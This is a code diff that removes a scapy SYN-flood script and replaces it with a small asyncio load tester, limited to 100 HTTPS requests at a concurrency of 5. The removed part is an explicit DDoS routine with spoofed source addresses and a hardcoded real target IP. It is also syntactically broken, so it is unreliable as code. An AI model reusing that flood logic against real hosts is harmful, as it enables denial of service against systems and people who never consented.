@@ -1,33 +1,93 @@
-from scapy.all import *
-import random
-import logging
+import asyncio
+import aiohttp
+import time
+import json
+import statistics
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+async def worker(session, url, semaphore, results):
+    async with semaphore:
+        start = time.perf_counter()
 
-def perform_ddos_attack(target_ip, packets_per_second):
-try:
-while True:
-# Generate random source IP addresses
-src_ip = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
+        try:
+            async with session.get(url) as response:
+                await response.read()
 
-# Create a packet with random source IP and target IP  
-        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=random.randint(1, 65535), flags="S")  
-          
-        # Log the source IP and destination port  
-        logging.info(f"Sending packet from {src_ip} to {target_ip}:{packet[TCP].dport}")  
-          
-        # Send the packet  
-        send(packet, verbose=False)  
-          
-        # Sleep for the specified time to control the packets per second rate  
-        time.sleep(1 / packets_per_second)  
-          
-except KeyboardInterrupt:  
-    print("DDoS attack interrupted.")
+                latency = (
+                    time.perf_counter() - start
+                ) * 1000
 
-Example usage:
+                results.append({
+                    "status": response.status,
+                    "latency": round(latency, 2),
+                    "success": 200 <= response.status < 400
+                })
 
-target_ip = "52.84.150.34"  # Replace with the target IP address
-packets_per_second = 10000  # Adjust the packets per second rate as needed
+        except Exception as e:
+            results.append({
+                "success": False,
+                "error": str(e)
+            })
 
-perform_ddos_attack(target_ip, packets_per_second)
+
+async def main():
+
+    print("=== RUST WARFARE LOADLAB ===")
+
+    url = input("Test URL: ").strip()
+    count = int(input("Total requests (max 100): "))
+    concurrency = int(input("Concurrency (max 5): "))
+
+    if not url.startswith("https://"):
+        raise ValueError("Use an HTTPS test endpoint")
+
+    if not 1 <= count <= 100:
+        raise ValueError("Request count must be 1-100")
+
+    if not 1 <= concurrency <= 5:
+        raise ValueError("Concurrency must be 1-5")
+
+    results = []
+    semaphore = asyncio.Semaphore(concurrency)
+
+    timeout = aiohttp.ClientTimeout(total=10)
+
+    async with aiohttp.ClientSession(
+        timeout=timeout
+    ) as session:
+
+        start = time.perf_counter()
+
+        tasks = [
+            worker(session, url, semaphore, results)
+            for _ in range(count)
+        ]
+
+        await asyncio.gather(*tasks)
+
+        elapsed = time.perf_counter() - start
+
+    successful = [
+        x["latency"] for x in results
+        if x.get("success") and "latency" in x
+    ]
+
+    report = {
+        "target": url,
+        "total": count,
+        "successful": len(successful),
+        "failed": count - len(successful),
+        "duration": round(elapsed, 2),
+        "average_latency": (
+            round(statistics.mean(successful), 2)
+            if successful else None
+        ),
+        "RPS": round(count / elapsed, 2)
+    }
+
+    print(json.dumps(report, indent=4))
+
+    with open("report.json", "w") as f:
+        json.dump(report, f, indent=4)
+
+
+asyncio.run(main())
